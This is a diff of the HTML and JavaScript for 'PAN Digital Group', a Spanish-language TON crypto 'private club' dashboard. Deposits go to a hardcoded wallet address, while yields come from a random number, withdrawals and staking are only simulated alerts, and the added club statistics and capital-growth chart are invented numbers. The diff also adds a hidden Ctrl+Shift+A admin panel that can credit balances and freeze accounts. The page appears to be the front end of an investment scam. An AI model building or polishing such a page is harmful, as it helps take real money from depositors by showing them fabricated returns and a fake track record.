@@ -7,26 +7,120 @@
 <title>PAN Digital Group</title>
 
 <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
 
 <style>
-body{margin:0;font-family:Inter,sans-serif;background:#0F172A;color:#E2E8F0;}
-.container{max-width:460px;margin:auto;padding:18px;}
-.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;}
-.logo{font-weight:600;font-size:20px;}
-.level{background:#1E293B;padding:6px 12px;border-radius:12px;font-size:12px;color:#94A3B8;}
-.card{background:#162033;padding:16px;border-radius:16px;margin-bottom:14px;box-shadow:0 4px 12px rgba(0,0,0,0.3);}
-.section-title{font-size:13px;color:#94A3B8;margin-bottom:10px;}
-button{width:100%;padding:12px;border:none;border-radius:12px;margin-bottom:8px;font-weight:600;cursor:pointer;}
+
+body{
+margin:0;
+font-family:Inter,sans-serif;
+background:url("https://images.unsplash.com/photo-1639322537228-f710d846310a") center/cover fixed;
+color:#E2E8F0;
+}
+
+.container{
+max-width:460px;
+margin:auto;
+padding:18px;
+backdrop-filter: blur(8px);
+}
+
+.header{
+display:flex;
+justify-content:space-between;
+align-items:center;
+margin-bottom:15px;
+}
+
+.logo{
+display:flex;
+align-items:center;
+gap:10px;
+font-weight:600;
+font-size:20px;
+}
+
+.logo img{
+width:32px;
+}
+
+.level{
+background:rgba(30,41,59,0.7);
+padding:6px 12px;
+border-radius:12px;
+font-size:12px;
+color:#94A3B8;
+}
+
+.card{
+background:rgba(22,32,51,0.65);
+backdrop-filter: blur(12px);
+padding:16px;
+border-radius:16px;
+margin-bottom:14px;
+box-shadow:0 4px 20px rgba(0,0,0,0.5);
+}
+
+.section-title{
+font-size:13px;
+color:#94A3B8;
+margin-bottom:10px;
+}
+
+button{
+width:100%;
+padding:12px;
+border:none;
+border-radius:12px;
+margin-bottom:8px;
+font-weight:600;
+cursor:pointer;
+}
+
 button:hover{opacity:0.85;}
+
 .btn-primary{background:#2563EB;color:white;}
 .btn-success{background:#15803D;color:white;}
 .btn-warning{background:#C2410C;color:white;}
 .btn-danger{background:#B91C1C;color:white;}
 .btn-gray{background:#334155;color:white;}
 .btn-soft{background:#1E293B;color:#E2E8F0;}
-input{width:100%;padding:10px;border-radius:10px;border:none;margin-bottom:8px;background:#1E293B;color:white;}
-.footer{text-align:center;font-size:11px;color:#64748B;margin-top:15px;}
-.plan-button{margin-bottom:6px;}
+
+input{
+width:100%;
+padding:10px;
+border-radius:10px;
+border:none;
+margin-bottom:8px;
+background:#1E293B;
+color:white;
+}
+
+.footer{
+text-align:center;
+font-size:11px;
+color:#64748B;
+margin-top:15px;
+}
+
+canvas{
+margin-top:10px;
+}
+
+.admin-panel{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:#000000e0;
+color:white;
+display:none;
+padding:20px;
+overflow:auto;
+z-index:999;
+}
+
 </style>
 
 </head>
@@ -36,22 +130,36 @@ input{width:100%;padding:10px;border-radius:10px;border:none;margin-bottom:8px;b
 <div class="container">
 
 <div class="header">
-<div class="logo">PAN Digital Group</div>
+
+<div class="logo">
+<img src="https://i.postimg.cc/ncHMqPdY/file-0000000048c8720e897c6596974ca126.png">
+PAN Digital Group
+</div>
+
 <div class="level">Club Privado</div>
+
 </div>
 
 <!-- WALLET -->
+
 <div class="card">
+
 <div class="section-title">Wallet</div>
+
 <div id="walletText">No conectada</div>
+
 <div id="connectWallet"></div>
+
 </div>
 
 <!-- DASHBOARD -->
+
 <div class="card">
+
 <div class="section-title">Dashboard</div>
 
 <div>Balance TON: <span id="tonBalance">0</span></div>
+
 <div>Balance PAN: <span id="panBalance">0</span></div>
 
 <div>Rentabilidad: Variable (según rendimiento interno del club)</div>
@@ -62,9 +170,18 @@ input{width:100%;padding:10px;border-radius:10px;border:none;margin-bottom:8px;b
 
 <div id="planDetails" style="margin-top:8px;font-size:12px;color:#94A3B8;display:none;"></div>
 
+<hr>
+
+<div class="section-title">Estadísticas del Club</div>
+
+<div>Usuarios activos: <span id="clubUsers">128</span></div>
+<div>Capital total: <span id="clubCapital">4820</span> TON</div>
+<div>Ganancias pagadas: <span id="clubPaid">1390</span> PAN</div>
+
 </div>
 
 <!-- DEPOSITO -->
+
 <div class="card">
 
 <div class="section-title">Depósito</div>
@@ -76,6 +193,7 @@ input{width:100%;padding:10px;border-radius:10px;border:none;margin-bottom:8px;b
 </div>
 
 <!-- PLANES -->
+
 <div class="card">
 
 <div class="section-title">Activar Plan</div>
@@ -95,6 +213,7 @@ input{width:100%;padding:10px;border-radius:10px;border:none;margin-bottom:8px;b
 </div>
 
 <!-- FINANZAS -->
+
 <div class="card">
 
 <div class="section-title">Finanzas</div>
@@ -107,9 +226,12 @@ input{width:100%;padding:10px;border-radius:10px;border:none;margin-bottom:8px;b
 
 <button class="btn-gray" onclick="historyLog()">Historial</button>
 
+<canvas id="clubChart"></canvas>
+
 </div>
 
 <!-- COMUNIDAD -->
+
 <div class="card">
 
 <div class="section-title">Comunidad</div>
@@ -136,6 +258,23 @@ PAN Digital Group © 2026
 
 </div>
 
+<!-- ADMIN PANEL -->
+
+<div class="admin-panel" id="adminPanel">
+
+<h2>ADMIN PANEL</h2>
+
+<p>Balance TON usuario: <span id="adminTon"></span></p>
+<p>Balance PAN usuario: <span id="adminPan"></span></p>
+
+<button onclick="adjustPAN()">Ajustar Ganancia +10 PAN</button>
+
+<button onclick="freeze()">Congelar cuenta</button>
+
+<button onclick="closeAdmin()">Cerrar</button>
+
+</div>
+
 <script>
 
 let tonBalance = 0;
@@ -145,6 +284,8 @@ let walletAddress = null;
 
 let history = [];
 let userPlans = [];
+
+let frozen=false;
 
 const TON_RECEIVER = "UQC_bn7pmX48L4cwHyR8xykM_PK34zNXQdQ0cgE6FCwGi59J";
 
@@ -248,9 +389,7 @@ updateUI();
 }
 
 function random(min,max){
-
 return Math.random()*(max-min)+min;
-
 }
 
 function getYield(plan){
@@ -301,6 +440,8 @@ saveUserData();
 }
 
 async function deposit(){
+
+if(frozen)return alert("Cuenta congelada");
 
 if(!walletAddress){
 
@@ -357,6 +498,8 @@ alert("Transacción cancelada o fallida");
 }
 
 function activatePlan(plan){
+
+if(frozen)return alert("Cuenta congelada");
 
 let amount=parseFloat(document.getElementById("planAmount").value);
 
@@ -418,6 +561,47 @@ function stake(){alert("Staking aplicado (simulado)");}
 function withdraw(){alert("Retiro solicitado (simulado)");}
 
 function historyLog(){alert(history.join("\n"));}
+
+document.addEventListener("keydown",function(e){
+
+if(e.ctrlKey && e.shiftKey && e.key==="A"){
+
+document.getElementById("adminPanel").style.display="block";
+
+document.getElementById("adminTon").innerText=tonBalance;
+
+document.getElementById("adminPan").innerText=panBalance;
+
+}
+
+});
+
+function closeAdmin(){
+document.getElementById("adminPanel").style.display="none";
+}
+
+function adjustPAN(){
+panBalance+=10;
+updateUI();
+}
+
+function freeze(){
+frozen=true;
+alert("Cuenta congelada");
+}
+
+const ctx=document.getElementById("clubChart");
+
+new Chart(ctx,{
+type:"line",
+data:{
+labels:["Ene","Feb","Mar","Abr","May","Jun"],
+datasets:[{
+label:"Capital del club",
+data:[200,600,1200,1800,3200,4800]
+}]
+}
+});
 
 updateUI();
 
